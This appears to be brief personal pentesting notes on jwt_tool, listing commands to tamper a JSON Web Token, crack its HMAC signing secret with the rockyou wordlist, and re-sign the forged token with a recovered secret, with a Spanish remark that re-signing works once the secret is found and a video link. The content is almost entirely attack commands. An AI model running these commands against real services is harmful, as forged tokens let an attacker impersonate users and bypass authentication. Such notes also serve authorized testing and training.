# JWT Tool


    python3 jwt_tool.py eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9..QQRk6z2UmCwJL4mYqLjhNAL7lSnyGG3NPDaOnh3VtC3l6hRROTr70FpGcp8CsuUlC-6PDXN9PKAyDRe_nD732A -T

Crack the secret

    python3 jwt_tool.py eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9..QQRk6z2UmCwJL4mYqLjhNAL7lSnyGG3NPDaOnh3VtC3l6hRROTr70FpGcp8CsuUlC-6PDXN9PKAyDRe_nD732A -C -d /usr/share/wordlist/rockyou.txt



    python3 jwt_tool.py eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9..QQRk6z2UmCwJL4mYqLjhNAL7lSnyGG3NPDaOnh3VtC3l6hRROTr70FpGcp8CsuUlC-6PDXN9PKAyDRe_nD732A -T -S hs256 -p 'secret'



https://www.youtube.com/watch?v=ZGarKE9KTAY

Se puede volver a firmar el token despues del tamper si se logra obtener el secret.
